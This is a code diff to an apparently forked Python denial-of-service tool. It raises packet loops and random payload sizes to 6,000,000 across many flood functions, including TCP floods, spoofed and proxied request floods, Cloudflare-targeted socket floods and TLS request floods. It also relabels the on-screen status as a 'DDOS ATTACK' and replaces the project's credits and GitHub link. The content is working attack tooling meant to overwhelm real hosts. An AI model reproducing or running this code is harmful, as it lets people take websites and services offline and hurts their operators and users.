@@ -12,7 +12,7 @@ def countdown(t):
     while True:
         if (until - datetime.datetime.now()).total_seconds() > 0:
             stdout.flush()
-            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" PERMINTAAN STATUS => " + str((until - datetime.datetime.now()).total_seconds()) + " TERKIRIM ")
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" PERMINTAAN DDOS ATTACK STATUS => " + str((until - datetime.datetime.now()).total_seconds()) + " TERKIRIM ")
         else:
             stdout.flush()
             stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" PERMINTAAN SELESAI =\n "+Fore.MAGENTA+"[*]"+Fore.WHITE+" STATUS PENGIRIMAN DI MULAI....                               \n")
@@ -69,7 +69,7 @@ def get_cookie(url):
     driver = webdriver.Chrome(options=options)
     driver.implicitly_wait(3)
     driver.get(url)
-    for _ in range(60):
+    for _ in range(6000000):
         cookies = driver.get_cookies()
         tryy = 0
         for i in cookies:
@@ -128,7 +128,7 @@ def get_info_l4():
 #region layer4
 def runflooder(host, port, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    rand = random._urandom(4096)
+    rand = random._urandom(6000000)
     for _ in range(int(th)):
         try:
             thd = threading.Thread(target=flooder, args=(host, port, rand, until))
@@ -148,7 +148,7 @@ def flooder(host, port, rand, until_datetime):
 
 def runsender(host, port, th, t, payload):
     if payload == "":
-        payload = random._urandom(60000)
+        payload = random._urandom(6000000)
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     #payload = Payloads[method]
     for _ in range(int(th)):
@@ -331,7 +331,7 @@ def AttackSOC(target, until_datetime, req):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             try:
-                for _ in range(600):
+                for _ in range(6000000):
                     s.send(str.encode(req))
             except:
                 s.close()
@@ -362,7 +362,7 @@ def AttackPPS(target, until_datetime): #
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             try:
-                for _ in range(100):
+                for _ in range(6000000):
                     s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
             except:
                 s.close()
@@ -396,7 +396,7 @@ def AttackNULL(target, until_datetime, req): #
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             try:
-                for _ in range(100):
+                for _ in range(6000000):
                     s.send(str.encode(req))
             except:
                 s.close()
@@ -431,7 +431,7 @@ def AttackSPOOF(target, until_datetime, req): #
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             try:
-                for _ in range(100):
+                for _ in range(6000000):
                     s.send(str.encode(req))
             except:
                 s.close()
@@ -474,7 +474,7 @@ def AttackPXSPOOF(target, until_datetime, req, proxy): #
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             try:
-                for _ in range(100):
+                for _ in range(6000000):
                     s.send(str.encode(req))
             except:
                 s.close()
@@ -602,7 +602,7 @@ def AttackCFSOC(until_datetime, target, req):
         packet.connect((str(target['host']), int(target['port'])))
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            for _ in range(10):
+            for _ in range(6000000):
                 packet.send(str.encode(req))
         except:
             pass
@@ -635,7 +635,7 @@ def LaunchSKY(url, timer):
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
-                for _ in range(60000):
+                for _ in range(6000000):
                     s.send(str.encode(req))
                     s.send(str.encode(req))
             except:
@@ -667,7 +667,7 @@ def LaunchSTELLAR(url, timer):
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
-                for _ in range(100):
+                for _ in range(6000000):
                     s.send(str.encode(req))
                     s.send(str.encode(req))
             except:
@@ -778,7 +778,7 @@ def test2(until_datetime, target, req):
         packet.connect((str(target['host']), int(target['port'])))
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            for _ in range(10):
+            for _ in range(6000000):
                 packet.send(str.encode(req))
         except:
             packet.close()
@@ -809,14 +809,14 @@ def help():
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"╠═════════════════════════════════════════════════════╣\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Thanks for using DOS.                "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Plz star project :)                    "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/HyukIsBack/DOS-DDoS       "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/Ro0TN3T/dos               "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
 def credit():
     stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Developer "+Fore.RED+": \x1b[38;2;0;255;189mHyuk\n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"UI Design "+Fore.RED+": \x1b[38;2;0;255;189mYone不\n")
+    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"UI Design "+Fore.RED+": \x1b[38;2;0;255;189mRo0T_N3T\n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Methods/Tools "+Fore.RED+": \x1b[38;2;0;255;189mSkyWtkh\n")
     stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
     stdout.write("\n")    
